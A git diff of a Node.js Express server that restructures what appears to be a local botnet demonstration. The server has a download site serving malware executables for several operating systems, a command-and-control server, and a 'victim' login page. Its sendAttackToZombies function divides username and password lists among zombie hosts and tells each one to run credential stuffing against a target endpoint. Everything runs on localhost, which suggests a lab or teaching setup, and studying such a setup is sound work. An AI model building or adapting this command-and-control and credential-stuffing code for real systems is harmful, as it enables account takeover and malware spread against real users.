@@ -11,52 +11,51 @@ const axios = require("axios");
 let zombies = [];
 let credentials = [];
 
-const sendAttackToZombies = (data) => {
-    let { host, endpoint, delay, usernames, passwords } = data;
-    let usernamesPerZombie = Math.floor(usernames.length / zombies.length);
-    if (usernamesPerZombie === 0) {
-        usernamesPerZombie = 1;
-    }
+(async function() {
+    await initDownloadSite();
+    await initCommandAndControl();
+    await initVictim();
+})();
 
-    // let usernameIndex = 0;
-    zombies.forEach((zombie) => {
-        let usernameCount = 0;
-        let zombieUsernames = [];
-        //create array of usernames for this zombie to use
-        while (usernameCount < usernamesPerZombie && usernames.length > 0) {
-            zombieUsernames.push(usernames.pop());
-            usernameCount += 1;
-        }
-        //only send the request if there are usernames
-        if (zombieUsernames.length > 0) {
-            const data = {
-                host,
-                endpoint,
-                delay,
-                usernames: zombieUsernames,
-                passwords: passwords,
-            };
-            axios
-                .post(`${zombie}/credential-stuffing`, JSON.stringify(data), {
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                })
-                .then((res) => {
+const initDownloadSite = async() => {
+    const port = await getPort({ port: 8000 }); //find an availble port (default 8000)
+    const host = `http://127.0.0.1:${port}`;
 
-                    // console.log(res);
-                })
-                .catch((err) => {
-                    console.error(err);
-                });
+
+    app.get("/files/:file(*)", function(req, res, next) { //serve malware executables
+        var filePath = path.join(__dirname, "/malware/build/", req.params.file);
+        if (
+            req.params.file === "malware-linux" ||
+            req.params.file === "malware-macos"
+        ) {
+            res.set("Content-Type", "application/x-elf");
+        } else {
+            res.set("Content-Type", "application/x-msdownload");
         }
+
+        res.download(filePath, function(err) {
+            if (!err) return; // file sent
+            if (err.status !== 404) return next(err); // non-404 error
+            // file for download not found
+            res.statusCode = 404;
+            res.send("Cant find that file, sorry!");
+        });
     });
-};
 
-const setupCommandAndControl = async() => {
+    app.get("/", function(req, res) {
+        res.sendFile(path.join(__dirname + "/index.html"));
+    });
+
+    app.listen(port, async() => {
+        await open(`${host}/`);
+    });
+    console.log(`Downloads site running on port ${port}`);
+}
+
+const initCommandAndControl = async() => {
     app.use(
         "/command.js",
-        express.static(path.join(__dirname, "/c-and-c/command.js"))
+        express.static(path.join(__dirname, "/controls/command.js"))
     );
     const port = await getPort({ port: 3001 });
     const host = `http://127.0.0.1:${port}`;
@@ -67,7 +66,7 @@ const setupCommandAndControl = async() => {
         return;
     }
     app.get("/command", function(req, res) {
-        res.sendFile(path.join(__dirname, "/c-and-c/command.html"));
+        res.sendFile(path.join(__dirname, "/controls/command.html"));
     });
 
     app.use(express.json());
@@ -116,7 +115,7 @@ const setupCommandAndControl = async() => {
     console.log(`Command and control running on port ${port}`);
 };
 
-const setupLogin = async() => {
+const initVictim = async() => {
     app.use(
         "/login.js",
         express.static(path.join(__dirname, "/victim/login.js"))
@@ -156,43 +155,43 @@ const setupLogin = async() => {
     console.log(`Victim running on port ${port}`);
 };
 
-(async function() {
-    const port = await getPort({ port: 8000 });
-    const host = `http://127.0.0.1:${port}`;
+const sendAttackToZombies = (data) => {
+    let { host, endpoint, delay, usernames, passwords } = data;
+    let usernamesPerZombie = Math.floor(usernames.length / zombies.length);
+    if (usernamesPerZombie === 0) {
+        usernamesPerZombie = 1;
+    }
 
-    app.get("/files/:file(*)", function(req, res, next) {
-        var filePath = path.join(__dirname, "/malware/build/", req.params.file);
-        if (
-            req.params.file === "malware-linux" ||
-            req.params.file === "malware-macos"
-        ) {
-            res.set("Content-Type", "application/x-elf");
-        } else {
-            res.set("Content-Type", "application/x-msdownload");
+    zombies.forEach((zombie) => {
+        let usernameCount = 0;
+        let zombieUsernames = [];
+        //create array of usernames for this zombie to use
+        while (usernameCount < usernamesPerZombie && usernames.length > 0) {
+            zombieUsernames.push(usernames.pop());
+            usernameCount += 1;
         }
+        //only send the request if there are usernames
+        if (zombieUsernames.length > 0) {
+            const data = {
+                host,
+                endpoint,
+                delay,
+                usernames: zombieUsernames,
+                passwords: passwords,
+            };
+            axios
+                .post(`${zombie}/credential-stuffing`, JSON.stringify(data), {
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                })
+                .then((res) => {
 
-        res.download(filePath, function(err) {
-            if (!err) return; // file sent
-            if (err.status !== 404) return next(err); // non-404 error
-            // file for download not found
-            res.statusCode = 404;
-            res.send("Cant find that file, sorry!");
-        });
+                    // console.log(res);
+                })
+                .catch((err) => {
+                    console.error(err);
+                });
+        }
     });
-
-    app.get("/", function(req, res) {
-        res.sendFile(path.join(__dirname + "/index.html"));
-    });
-
-    app.get("/downloads/malware-macos", function(req, res) {
-        res.type("application/x-elf");
-        res.sendFile(path.join(__dirname, "./malware/build/malware-macos"));
-    });
-
-    app.listen(port, async() => {
-        await open(`${host}/`);
-        setupCommandAndControl();
-        setupLogin();
-    });
-    console.log(`Running on port ${port}`);
-})();
+};
